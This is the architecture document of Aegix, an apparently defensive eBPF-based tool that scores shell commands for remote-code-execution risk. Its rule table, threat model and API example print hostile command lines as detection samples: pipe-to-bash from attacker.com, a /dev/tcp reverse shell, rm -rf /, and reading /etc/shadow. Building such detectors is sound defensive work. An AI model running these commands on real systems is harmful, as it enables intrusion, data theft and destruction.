# System Architecture

<p align="center">
   <img src="../frontend/src/assets/aegix-logo.png" alt="Aegix logo" width="180" />
</p>

## Overview

Aegix is a **four-layer real-time RCE prevention system** that combines an always-on agent, kernel-level monitoring, intelligent threat detection, and a live dashboard.

```
┌─────────────────────────────────────────────────────────────┐
│  Layer 3: Dashboard (Visualization & Alerting)             │
│  - React web UI                                            │
│    * Local: http://localhost:5173                          │
│    * Production: https://kernalaisecurity-...railway.app   │
│  - Real-time event feed via WebSocket                      │
│  - Risk visualization & attack analysis                    │
└──────────────────────┬──────────────────────────────────────┘
                       │ WebSocket
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 2: Aegix (Intelligence & Decision)                 │
│  - Rule Engine (60% weight)                                │
│    * Pattern matching (injection, shells, reverse shells)  │
│    * Keyword detection (curl, wget, bash, etc.)            │
│    * Encoded payload detection (base64, hex)               │
│  - ML Scorer (40% weight)                                  │
│    * Logistic Regression on TF-IDF features               │
│  - Combined risk score (0-100)                             │
│  - Classification (safe/suspicious/malicious)             │
└──────────────────────┬──────────────────────────────────────┘
                       │
┌─────────────────────────────────────────────────────────────┐
│  Layer 1: Aegix (Enforcement)                              │
│  - eBPF tracepoint hook on execve syscall                  │
│  - Captures: pid, ppid, uid, command, args                 │
│  - Streams events to user space via ring buffer            │
│  - Graceful fallback on Windows/WSL2                       │
└─────────────────────────────────────────────────────────────┘
                       │
┌─────────────────────────────────────────────────────────────┐
│  Layer 4: Agent Runtime (Always On)                        │
│  - Starts the backend as a background service              │
│  - Detects Linux vs macOS vs Windows capability            │
│  - Runs kernel mode on Linux and API-only mode elsewhere   │
└─────────────────────────────────────────────────────────────┘
```

---

## Data Flow

### 1. Command Execution Path

```
User/Process attempts execution
       ↓
Agent runtime keeps backend alive
   ↓
Aegix (eBPF) intercepts execve (Linux only)
       ↓
Ring buffer → User space (Python)
       ↓
Detection Pipeline receives event
       ↓
Psutil enriches event with process RSS memory & system RAM%
       ↓
Rule Engine + ML Scorer analyze command + memory metrics
       ↓
Risk score calculated (0-100)
       ↓
Classification: safe / suspicious / malicious
       ↓
Event stored in memory buffer (and later persistence layer)
       ↓
WebSocket broadcasts to all connected clients
       ↓
Dashboard updates in real-time
```

### 3. Agent Startup Path

The agent/runtime is the first process the user starts. It determines whether the machine can run kernel mode or must remain API-only.

- **Linux**: runs in kernel mode and starts the backend in always-on monitoring mode.
- **Windows**: runs in API-only mode.
- **macOS**: runs in API-only mode until a native collector exists.

### 2. API Command Analysis Path

```
curl -X POST /analyze {"command":"..."}
       ↓
FastAPI endpoint receives request
       ↓
Detection Pipeline.detect(command)
       ↓
Rule Engine + ML Scorer process
       ↓
Risk score + classification returned
       ↓
Client receives JSON response
```

---

## Component Details

### Layer 1: Aegix (eBPF)

**File**: `kernel/execve_hook.c`, `backend/kernel/rce_monitor.py`

**Responsibility**: Monitor system calls at kernel level

**Key Features**:
- Hooks `tracepoint/syscalls/sys_enter_execve` (kernel 5.4+)
- Zero-copy event streaming via BPF ring buffer
- Captures with minimal overhead (<1% CPU)
- Requires: `CAP_BPF` or root privilege

**Event Captured**:
```c
struct execve_event {
    u32 pid;           // Process ID
    u32 ppid;          // Parent process ID
    u32 uid;           // User ID
    u32 gid;           // Group ID
    char comm[16];     // Process name
    char argv[4096];   // Full command line
    u64 timestamp;     // Kernel timestamp
}
```

**Status**: Phase 2 (Completed ✅)

**Implementation Details**:
- **Language**: eBPF (C) + Python/BCC
- **Hook Type**: `tracepoint/syscalls/sys_enter_execve` (kernel 5.4+)
- **Data Transport**: BPF ring buffer (zero-copy, lock-free)
- **User Space Loader**: BCC (Berkeley Packet Filter Compiler Collection)
- **Threading**: Background thread polls ring buffer every 100ms
- **Overhead**: <1% CPU on idle systems
- **Privileges Required**: `CAP_BPF` or root

**Key Files**:
- `kernel/execve_hook.c` - eBPF tracepoint hook (~120 lines)
- `kernel/Makefile` - Compilation pipeline (clang → llvm → eBPF .o)
- `backend/kernel/rce_monitor.py` - BCC loader + ring buffer poller

**How It Works**:
1. eBPF program hooks `sys_enter_execve` tracepoint in kernel
2. On each exec attempt, allocates event from ring buffer
3. Captures PID, PPID, UID, GID, command, args (all with minimal overhead)
4. Submits to ring buffer (non-blocking, zero-copy)
5. Python background thread polls ring buffer (100ms timeout)
6. Converts binary events to `ExecveEvent` objects
7. **Python immediately samples `psutil.Process(pid).memory_info().rss`** and `psutil.virtual_memory().percent` — this is the Memory Profiling layer enrichment
8. Passes enriched event to Aegix detection pipeline (Layer 2)
9. Stores and broadcasts the resulting `SecurityEvent` to the dashboard

### Layer 2: Aegix (Detection Pipeline)

**Files**: 
- `backend/detection/rule_engine.py` - Pattern matching
- `backend/detection/ml_scorer.py` - ML inference
- `backend/detection/pipeline.py` - Orchestration

**Responsibility**: Analyze commands and determine threat level

#### Sub-Layer 2A: Rule Engine (60% weight)

Pattern-based detection for common RCE attacks:

| Pattern | Examples | Score |
|---------|----------|-------|
| Shell Piping | `curl \| bash` | +25 |
| Reverse Shells | `/dev/tcp, nc -l, socat` | +30 |
| Destructive | `rm -rf /, mkfs, dd /dev/zero` | +35 |
| Privilege Escalation | `sudo -u root, su root` | +25 |
| Data Exfiltration | `cat /etc/shadow > /tmp/` | +20 |
| Encoded Payloads | `base64 -d, xxd -r` | +15 |

Rules are cumulative (capped at 100).

**Code Example**:
```python
rule_score, matched_rules = rule_engine.score_rules(command)
# Returns: (45.0, ["shell_piping", "reverse_shell_pattern"])
```

#### Sub-Layer 2B: ML Scorer (40% weight)

Machine learning classification using scikit-learn:

**Model**: Logistic Regression
**Training Data**: ~12,000 sanitized commands (safe + malicious)
**Features**: 5,000-feature TF-IDF with unigrams + bigrams, sublinear_tf, balanced class weights
**Accuracy**: 98.83% · MAP: 0.9925 · R²: 0.9060 · RMSE: 0.1208

**Feature Engineering**:
- Command token frequency (TF-IDF weighted)
- N-gram patterns (`|bash`, `-e /bin/sh`, etc.)
- Sublinear TF dampening (prevents token-spam attacks)
- Balanced class weights (prevents safe-class bias)

**Code Example**:
```python
ml_score, confidence = ml_scorer.score_ml(command)
# Returns: (85.3, 0.92) - 85.3/100 malicious probability, 92% confidence
```

#### Sub-Layer 2C: Memory Profiler (post-ring-buffer)

The Memory Profiling layer runs **after** the eBPF event surfaces from the kernel ring buffer, before the command enters the detection pipeline.

**Why not in the eBPF C program?**
- The eBPF VM verifier prohibits floating-point arithmetic (bytes → MB requires division).
- `task_mem_info()` requires CO-RE BTF type information not available on all kernel versions.
- Short-lived processes (e.g. `ls`) exit before the ring buffer is flushed — making in-kernel sampling unreliable.

**Implementation** (`backend/agent/main.py` + `backend/app.py`):
```python
# Runs immediately when the event exits the ring buffer (T=0)
try:
    proc = psutil.Process(execve_event.pid)
    process_memory_mb = proc.memory_info().rss / (1024 * 1024)  # bytes → MB
except (psutil.NoSuchProcess, psutil.AccessDenied):
    process_memory_mb = 0.0   # Process already exited — default to 0

system_memory_percent = psutil.virtual_memory().percent
```

**Scoring Rules** (`backend/detection/rule_engine.py`):

| Condition | Rule Name | Penalty |
|---|---|---|
| Process RSS > 50 MB at T=0 | `memory_hog_Xmb` | +30 pts |
| System RAM > 80% at intercept | `system_memory_critical_X%` | +10 pts |

**Why these thresholds?**
- A legitimately simple shell script should consume < 5 MB at spawn time. 50 MB is the threshold for "this process pre-allocated a suspicious buffer" — consistent with crypto-miners, exploitation payloads, and fork-bombs.
- 80% system RAM means the server is already under serious memory pressure. Any new process with a pattern match in that context has an elevated DoS risk score.

**Dashboard**: Both metrics are displayed in the Live Events Table (`Mem MB` and `RAM %` columns) and the Latest Detection card. Values exceeding thresholds are highlighted in red/amber.

#### Sub-Layer 2D: Combined Scoring

```python
risk_score = 0.6 * rule_score + 0.4 * ml_score

# Classification thresholds:
if risk_score < 30:
    classification = "safe"           # Allow execution
elif risk_score < 70:
    classification = "suspicious"     # Log & allow
else:
    classification = "malicious"      # Block & alert
```

### Layer 3: Dashboard (Visualization)

**Files**: `frontend/src/` (React + TypeScript)

**Responsibility**: Real-time visualization of threats

**Key Components**:

1. **WebSocket Connection**
   - `useWebSocket.ts` hook
   - Exponential backoff reconnect with jitter
   - Buffers last 1000 events in memory

2. **Dashboard View**
   - `Dashboard.tsx` - Main component
   - Stats cards (total, safe, suspicious, malicious)
   - Event table with risk visualization
   - Real-time updates

3. **Styling**
   - Color coding: Green (safe), Yellow (suspicious), Red (malicious)
   - Risk score bar chart
   - Responsive grid layout

### Layer 4: Agent Runtime (Always On)

**Files**: `backend/agent/runtime.py`, `backend/agent/bridge.py`, `scripts/run_agent.sh`, `scripts/run_agent.ps1`

**Responsibility**: Start the backend and choose the correct runtime mode for the host OS

**Key Features**:
- Detects Linux, macOS, Windows, or unsupported platforms
- Uses kernel mode on Linux
- Uses API-only mode on macOS and Windows
- Provides a consistent launch path for the rest of the stack

---

## API Reference

### Health Check

```http
GET /
```

**Response**:
```json
{
  "status": "online",
  "name": "Aegix Security",
  "version": "0.1.0",
  "events_stored": 42
}
```

### Analyze Command

```http
POST /analyze
Content-Type: application/json

{
  "command": "curl http://attacker.com/script.sh | bash"
}
```

**Response**:
```json
{
  "command": "curl http://attacker.com/script.sh | bash",
  "classification": "malicious",
  "risk_score": 85.2,
  "matched_rules": ["shell_piping"],
  "ml_confidence": 0.92,
  "explanation": "🚨 Command is likely malicious... | Risk Score: 85.2/100 | ..."
}
```

### Get Events

```http
GET /events?limit=100
```

**Response**: Array of SecurityEvent objects

### Get Statistics

```http
GET /stats
```

**Response**:
```json
{
  "total_events": 150,
  "safe": 120,
  "suspicious": 20,
  "malicious": 10
}
```

### WebSocket Events

```
ws://localhost:8000/ws
```

**Message Format**:
```json
{
  "id": "evt_a1b2c3d4",
  "pid": 1234,
  "ppid": 1200,
  "uid": 1000,
  "command": "ls -la",
  "argv_str": "ls -la",
  "timestamp": 1699500000.123,
  "classification": "safe",
  "risk_score": 10.5,
  "matched_rules": [],
  "ml_confidence": 0.05,
  "explanation": "..."
}
```

---

## Threat Model

### Attacks Detected

1. **Command Injection**
   - Pattern: `;`, `&&`, `||`, `|` with shell tools
   - Example: `ping google.com; cat /etc/shadow`

2. **Shell Escapes**
   - Pattern: Direct bash/sh/eval execution
   - Example: `bash -i`, `eval $(...)`, `exec /bin/bash`

3. **Reverse Shells**
   - Pattern: `/dev/tcp`, `nc`, `socat`, `tclsh`
   - Example: `bash -i >& /dev/tcp/attacker/4444 0>&1`

4. **Destructive Commands**
   - Pattern: Filesystem/system destruction
   - Example: `rm -rf / --no-preserve-root`, `mkfs`, `dd if=/dev/zero`

5. **Privilege Escalation**
   - Pattern: `sudo`, `su` with dangerous flags
   - Example: `sudo -u root /bin/bash`

6. **Data Exfiltration**
   - Pattern: Reading sensitive files
   - Example: `cat /etc/shadow > /tmp/shadow.txt`

7. **Encoded Payloads**
   - Pattern: Base64, hex decoding before execution
   - Example: `base64 -d | bash`, `echo \x2f\x62\x69\x6e\x2f\x62\x61\x73\x68`

### Limitations

- **False Positives**: Legitimate `eval` or `base64` usage flagged
- **Encoded Attacks**: Multi-layer encoding may bypass detection
- **Zero-Days**: Unknown attack vectors not in training data
- **LLM Reasoning**: Async interpretation remains a future enhancement

---

## Performance Characteristics

### Rule Engine
- **Time**: <1ms per command
- **Memory**: ~5KB resident
- **Accuracy**: 100% on known patterns

### ML Scorer
- **Time**: ~2-5ms per command (TF-IDF + prediction)
- **Memory**: ~2MB model size
- **Accuracy**: ~90% on test set

### eBPF Monitor
- **Overhead**: <1% CPU (ring buffer polling)
- **Latency**: <100μs per event
- **Memory**: ~50MB (ring buffer + maps)

### Total Decision Time
- **Combined**: ~5-10ms (rules + ML)
- **Async LLM**: +500ms-2s (future, non-blocking)

---

## Security Considerations

### Privilege Requirements

| Component | Requirement | Note |
|-----------|-------------|------|
| Rule Engine | None | User-space |
| ML Scorer | None | User-space |
| eBPF Monitor | CAP_BPF | Kernel requires capability |
| Dashboard | None | Web-based |

### Attack Surface

1. **Model Poisoning**: Retraining on malicious data could corrupt classifier
   - Mitigation: Version control + manual review of new data

2. **Bypass**: Sophisticated encoding might evade rules
   - Mitigation: Continuous rule updates + ML retraining

3. **Denial of Service**: Ring buffer overflow
   - Mitigation: Bounded buffer size + overflow handling

4. **Information Leakage**: Event log stored in memory
   - Mitigation: Clear events periodically + RBAC (future)

---

## Development Phases

### Phase 1: Kernel Monitoring (eBPF) ✅
- Hooking `sys_enter_execve` tracepoint
- Ring buffer integration

### Phase 2: Detection Pipeline ✅
- Rule engine + ML Scoring model
- Classification pipeline

### Phase 3: Real-time Dashboard ✅
- React UI with live WebSocket feed

### Phase 4: Always-On Agent ✅
- Background agent detection loop
- Forwarding events automatically

### Phase 5: Agent-to-Backend Bridge ✅
- `/agent/events` ingestion endpoint

### Phase 6: Persistent Event Storage ✅
- SQLite Database (`data/events.db`)
- In-memory LRU cache

### Phase 6b: Alerting & Webhooks ✅
- Configurable webhooks (Slack, Discord)
- Alert history tracking

### Phase 7: Auto-Remediation ✅
- Kill processes based on classification
- Quarantine remains a future extension

### Phase 8: Advanced Dashboard & Routing ✅
- Dynamic AI sensitivity threshold tuning
- Targeted webhook tagging (Safe/Suspicious/Malicious)
- Cyberpunk styled UI with real-time stats

---

## Future Enhancements

1. **LLM Reasoning**: Add GPT/Ollama layer for complex interpretation
2. **Cross-Platform**: Windows ETW, Mac DTrace backends
3. **Scaling**: Postgres + Redis for large-scale deployments

---

**Last Updated**: May 2026 | **Status**: Phase 8 Complete, Phase 9 Planned
